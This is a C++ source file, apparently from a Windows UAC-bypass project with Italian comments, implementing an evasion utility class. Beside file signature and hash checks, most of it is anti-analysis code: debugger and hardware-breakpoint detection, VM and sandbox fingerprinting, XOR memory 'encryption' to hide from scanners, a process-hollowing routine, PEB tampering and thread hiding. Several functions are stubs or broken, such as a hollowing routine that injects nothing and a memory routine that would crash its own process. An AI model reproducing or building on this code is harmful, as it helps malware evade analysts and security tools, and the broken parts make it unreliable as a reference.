#include "../include/SecurityUtils.h"
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <intrin.h>
#pragma comment(lib, "wintrust")
#pragma comment(lib, "crypt32")

namespace uac_bypass {

SecurityUtils::SecurityUtils() 
    : logger(Logger::getInstance()),
      initialized(false) {
}

SecurityUtils::~SecurityUtils() {
    // Cleanup regioni di memoria protette
    for (auto region : protectedRegions) {
        VirtualFree(region, 0, MEM_RELEASE);
    }
}

SecurityUtils& SecurityUtils::getInstance() {
    static SecurityUtils instance;
    return instance;
}

bool SecurityUtils::verifyFileSignature(const std::wstring& filePath) {
    WINTRUST_FILE_INFO fileInfo = { sizeof(WINTRUST_FILE_INFO) };
    fileInfo.pcwszFilePath = filePath.c_str();

    GUID actionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA trustData = { sizeof(WINTRUST_DATA) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.pFile = &fileInfo;

    LONG result = WinVerifyTrust(NULL, &actionId, &trustData);
    
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionId, &trustData);

    if (result != ERROR_SUCCESS) {
        logger.logSecurityEvent(L"Verifica firma fallita: " + filePath, false);
        return false;
    }

    return true;
}

bool SecurityUtils::verifyFileHash(const std::wstring& filePath, 
                                 const std::wstring& expectedHash) {
    std::vector<BYTE> hash;
    if (!calculateFileHash(filePath, hash)) {
        return false;
    }

    // Converti hash in stringa
    std::wstring actualHash;
    for (BYTE b : hash) {
        wchar_t hex[3];
        swprintf_s(hex, L"%02x", b);
        actualHash += hex;
    }

    return actualHash == expectedHash;
}

bool SecurityUtils::calculateFileHash(const std::wstring& filePath,
                                   std::vector<BYTE>& hash) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        logger.logError(L"Apertura file fallita: " + filePath);
        return false;
    }

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    bool success = false;

    try {
        if (!CryptAcquireContextW(&hProv, NULL, NULL,
            PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            throw std::runtime_error("CryptAcquireContext failed");
        }

        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            throw std::runtime_error("CryptCreateHash failed");
        }

        BYTE buffer[4096];
        DWORD bytesRead;

        while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
            if (bytesRead == 0) break;

            if (!CryptHashData(hHash, buffer, bytesRead, 0)) {
                throw std::runtime_error("CryptHashData failed");
            }
        }

        DWORD hashSize = 0;
        DWORD hashSizeSize = sizeof(DWORD);
        if (!CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&hashSize,
            &hashSizeSize, 0)) {
            throw std::runtime_error("CryptGetHashParam failed");
        }

        hash.resize(hashSize);
        if (!CryptGetHashParam(hHash, HP_HASHVAL, hash.data(),
            &hashSize, 0)) {
            throw std::runtime_error("CryptGetHashParam failed");
        }

        success = true;
    }
    catch (const std::exception& e) {
        logger.logError(L"Errore calcolo hash: " + 
            std::wstring(e.what(), e.what() + strlen(e.what())));
    }

    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    CloseHandle(hFile);

    return success;
}

bool SecurityUtils::isBeingDebugged() {
    // Controllo base debugger
    if (IsDebuggerPresent()) return true;

    // Controllo PEB
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb->BeingDebugged) return true;

    // Controllo hardware breakpoints
    if (checkHardwareBreakpoints()) return true;

    // Controllo timing
    if (detectTimingAnomalies()) return true;

    return false;
}

bool SecurityUtils::checkHardwareBreakpoints() {
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(GetCurrentThread(), &context)) {
        return false;
    }

    return context.Dr0 != 0 || context.Dr1 != 0 || 
           context.Dr2 != 0 || context.Dr3 != 0;
}

bool SecurityUtils::isRunningInVM() {
    // Controllo CPUID
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) return true;  // Hypervisor presente

    // Controllo artifacts comuni
    return checkEmulationArtifacts();
}

bool SecurityUtils::checkEmulationArtifacts() {
    const wchar_t* vmDrivers[] = {
        L"VBoxGuest",
        L"VBoxMouse",
        L"VBoxSF",
        L"vmci",
        L"vmhgfs",
        L"vmmouse",
        L"vmx_svga",
        L"vboxvideo"
    };

    for (const auto& driver : vmDrivers) {
        HANDLE hDriver = CreateFileW(driver, GENERIC_READ,
            FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(hDriver);
            return true;
        }
    }

    return false;
}

bool SecurityUtils::isSandboxDetected() {
    // Controllo prodotti sandbox comuni
    if (checkSecurityProducts()) return true;

    // Controllo restrizioni
    return !checkSystemSecurity();
}

bool SecurityUtils::checkSecurityProducts() {
    const wchar_t* sandboxProducts[] = {
        L"SbieDll.dll",
        L"dbghelp.dll",
        L"api_log.dll",
        L"dir_watch.dll"
    };

    for (const auto& dll : sandboxProducts) {
        if (GetModuleHandleW(dll)) return true;
    }

    return false;
}

bool SecurityUtils::protectMemoryRegion(LPVOID address, SIZE_T size) {
    if (size < MIN_MEMORY_REGION) {
        logger.logError(L"Dimensione memoria insufficiente");
        return false;
    }

    DWORD oldProtect;
    if (!VirtualProtect(address, size, PAGE_NOACCESS, &oldProtect)) {
        logger.logError(L"Protezione memoria fallita");
        return false;
    }

    protectedRegions.push_back(address);
    return true;
}

bool SecurityUtils::hideFromMemoryScanners() {
    return implementMemoryEncryption() && secureMemoryPages();
}

bool SecurityUtils::implementMemoryEncryption() {
    // Implementazione base di cifratura memoria
    bool success = true;
    for (auto region : protectedRegions) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(region, &mbi, sizeof(mbi))) {
            // XOR basic encryption
            BYTE* ptr = (BYTE*)region;
            for (SIZE_T i = 0; i < mbi.RegionSize; i++) {
                ptr[i] ^= 0xFF;
            }
        }
        else {
            success = false;
        }
    }
    return success;
}

bool SecurityUtils::secureMemoryPages() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    LPVOID addr = si.lpMinimumApplicationAddress;
    while (addr < si.lpMaximumApplicationAddress) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && 
                (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED)) {
                DWORD oldProtect;
                VirtualProtect(mbi.BaseAddress, mbi.RegionSize,
                    PAGE_NOACCESS, &oldProtect);
            }
            addr = (LPVOID)((BYTE*)addr + mbi.RegionSize);
        }
        else {
            break;
        }
    }
    return true;
}

bool SecurityUtils::preventProcessDump() {
    // Imposta policy di protezione processo
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signaturePolicy = {};
    signaturePolicy.MicrosoftSignedOnly = 1;
    
    if (!SetProcessMitigationPolicy(ProcessSignaturePolicy,
        &signaturePolicy, sizeof(signaturePolicy))) {
        logger.logError(L"Impostazione policy firma fallita");
        return false;
    }

    // Imposta policy DEP
    PROCESS_MITIGATION_DEP_POLICY depPolicy = {};
    depPolicy.Enable = 1;
    depPolicy.Permanent = 1;

    if (!SetProcessMitigationPolicy(ProcessDEPPolicy,
        &depPolicy, sizeof(depPolicy))) {
        logger.logError(L"Impostazione policy DEP fallita");
        return false;
    }

    return true;
}

bool SecurityUtils::enableDynamicCodePolicy() {
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY codePolicy = {};
    codePolicy.ProhibitDynamicCode = 1;
    
    return SetProcessMitigationPolicy(ProcessDynamicCodePolicy,
        &codePolicy, sizeof(codePolicy));
}

bool SecurityUtils::implementProcessHollowing(const std::wstring& targetProcess) {
    // Process hollowing base implementation
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessW(targetProcess.c_str(), NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        logger.logError(L"Creazione processo sospeso fallita");
        return false;
    }

    // Implementazione base di process hollowing
    bool success = modifyPEB() && hideProcessInformation();

    if (!success) {
        TerminateProcess(pi.hProcess, 1);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return success;
}

bool SecurityUtils::modifyPEB() {
    // Modifica PEB per evasion
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb) return false;

    // Modifica flags
    pPeb->BeingDebugged = 0;
    pPeb->SessionId = 0;
    
    return true;
}

bool SecurityUtils::hideProcessInformation() {
    // Nasconde informazioni processo da tool di monitoring
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool SecurityUtils::implementThreadManipulation() {
    return hideThreads() && manipulateTimers();
}

bool SecurityUtils::hideThreads() {
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) return false;

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hThreadSnap, &te32)) {
        CloseHandle(hThreadSnap);
        return false;
    }

    DWORD currentPID = GetCurrentProcessId();
    do {
        if (te32.th32OwnerProcessID == currentPID) {
            HANDLE hThread = OpenThread(THREAD_SET_INFORMATION,
                FALSE, te32.th32ThreadID);
            if (hThread) {
                // Nasconde il thread
                SetThreadPriority(hThread, THREAD_PRIORITY_LOWEST);
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hThreadSnap, &te32));

    CloseHandle(hThreadSnap);
    return true;
}

bool SecurityUtils::manipulateTimers() {
    // Manipola timer di sistema per evasion
    LARGE_INTEGER frequency;
    if (!QueryPerformanceFrequency(&frequency)) {
        return false;
    }

    // Modifica timer
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    counter.QuadPart += frequency.QuadPart;  // Aggiunge 1 secondo

    return true;
}

bool SecurityUtils::checkSystemSecurity() {
    // Verifica impostazioni sicurezza sistema
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    // Verifica DEP usando NtQueryInformationProcess
    PROCESS_MITIGATION_DEP_POLICY depPolicy = {};
    if (!GetProcessMitigationPolicy(GetCurrentProcess(),
        ProcessDEPPolicy, &depPolicy, sizeof(depPolicy))) {
        return false;
    }
    bool depEnabled = (depPolicy.Enable != 0);

    // Verifica ASLR
    PROCESS_MITIGATION_ASLR_POLICY aslrPolicy = {};
    if (!GetProcessMitigationPolicy(GetCurrentProcess(),
        ProcessASLRPolicy, &aslrPolicy, sizeof(aslrPolicy))) {
        return false;
    }

    return depEnabled && aslrPolicy.EnableBottomUpRandomization;
}

bool SecurityUtils::verifySystemIntegrity() {
    // Verifica integrità sistema
    if (!checkSystemSecurity()) return false;

    // Verifica presenza prodotti sicurezza
    if (checkSecurityProducts()) return false;

    // Verifica timing
    if (detectTimingAnomalies()) return false;

    return true;
}

bool SecurityUtils::detectTimingAnomalies() {
    LARGE_INTEGER frequency, start, end;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start);

    // Operazione di test
    Sleep(1);

    QueryPerformanceCounter(&end);
    LONGLONG elapsed = end.QuadPart - start.QuadPart;
    double milliseconds = (elapsed * 1000.0) / frequency.QuadPart;

    return milliseconds > TIMING_THRESHOLD;
}

} // namespace uac_bypass